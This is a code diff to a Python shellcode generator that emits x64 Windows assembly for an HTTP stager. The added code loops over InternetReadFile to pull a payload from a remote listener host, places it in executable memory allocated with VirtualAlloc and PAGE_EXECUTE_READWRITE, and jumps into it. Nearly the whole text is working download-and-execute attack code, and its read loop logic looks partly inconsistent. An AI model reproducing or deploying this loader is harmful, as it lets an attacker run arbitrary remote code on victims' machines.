@@ -85,14 +85,17 @@ class Shellcode():
 
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
-            "caUserAgent" : self.user_agent_size,
-            "caHost"      : len(self.lhost),
-            "caPath"      : len(self.path),
-            "caRequest"   : 0x00,
-            "hInternet"   : 0x00,
-            "hConnect"    : 0x00,
-            "hRequest"    : 0x00,
-            "dwFlags"     : 0x00,
+            "caUserAgent"           : self.user_agent_size,
+            "caHost"                : len(self.lhost),
+            "caPath"                : len(self.path),
+            "caRequest"             : 0x00,
+            "lpdwNumberOfBytesRead" : 0x00,
+            "lpvShellcode"          : 0x00,
+            "hInternet"             : 0x00,
+            "hConnect"              : 0x00,
+            "hRequest"              : 0x00,
+            "dwFlags"               : 0x00,
+            "dwSize"                : 0x00,
         })
 
         self.stack_space = builder.calc_stack_space(sc_args)
@@ -300,19 +303,59 @@ class Shellcode():
     mov rax, [rbp - {self.storage_offsets['InternetSetOptionA']}]
     call rax
 
-    ; BOOL HttpSendRequestA([in] HINTERNET hRequest,            // RCX
-    ;                       [in] LPCSTR    lpszHeaders,         // RDX
-    ;                       [in] DWORD     dwHeadersLength,     // R8
-    ;                       [in] LPVOID    lpOptional,          // R9
-    ;                       [in] DWORD     dwOptionalLength);   // [RSP + 0x20]
-    int3
+    ; BOOL HttpSendRequestA([in] HINTERNET hRequest,
+    ;                       [in] LPCSTR    lpszHeaders,
+    ;                       [in] DWORD     dwHeadersLength,
+    ;                       [in] LPVOID    lpOptional,
+    ;                       [in] DWORD     dwOptionalLength);
     mov rcx, [rbp - {self.storage_offsets['hRequest']}]
     xor rdx, rdx
     xor r8, r8
     xor r9, r9
     mov [rsp + 0x20], r9
     mov rax, [rbp - {self.storage_offsets['HttpSendRequestA']}]
-    call rax\n"""
+    call rax
+
+    ; BOOL InternetReadFile([in]  HINTERNET hFile,
+    ;                       [out] LPVOID    lpBuffer,
+    ;                       [in]  DWORD     dwNumberOfBytesToRead,
+    ;                       [out] LPDWORD   lpdwNumberOfBytesRead);
+
+    lea rdx, [rbp - {self.storage_offsets['dwSize']}]
+    mov r8, 0x08
+call_InternetReadFile:
+    mov rcx, [rbp - {self.storage_offsets['hRequest']}]
+    lea r9, [rbp - {self.storage_offsets['lpdwNumberOfBytesRead']}]
+    mov rax, [rbp - {self.storage_offsets['InternetReadFile']}]
+    call rax
+
+    mov eax, [rbp - {self.storage_offsets['lpdwNumberOfBytesRead']}]
+    cmp rax, 0x08
+    jg download_complete
+
+    ; LPVOID VirtualAlloc(
+    ;   [in, optional] LPVOID lpAddress,
+    ;   [in]           SIZE_T dwSize,
+    ;   [in]           DWORD  flAllocationType,
+    ;   [in]           DWORD  flProtect
+    ; );
+call_VirtualAlloc:
+    mov rcx, [rbp - {self.storage_offsets['lpvShellcode']}]
+    mov rdx, [rbp - {self.storage_offsets['dwSize']}]
+    mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
+    mov r9, {winnt.PAGE_EXECUTE_READWRITE}
+    mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
+    call rax
+
+    mov [rbp - {self.storage_offsets['lpvShellcode']}], rax
+    mov rdx, rax
+    mov r8, [rbp - {self.storage_offsets['dwSize']}]
+
+    jmp call_InternetReadFile
+
+download_complete:
+    jmp [rbp - {self.storage_offsets['lpvShellcode']}]\n"""
+
 
         return src
 
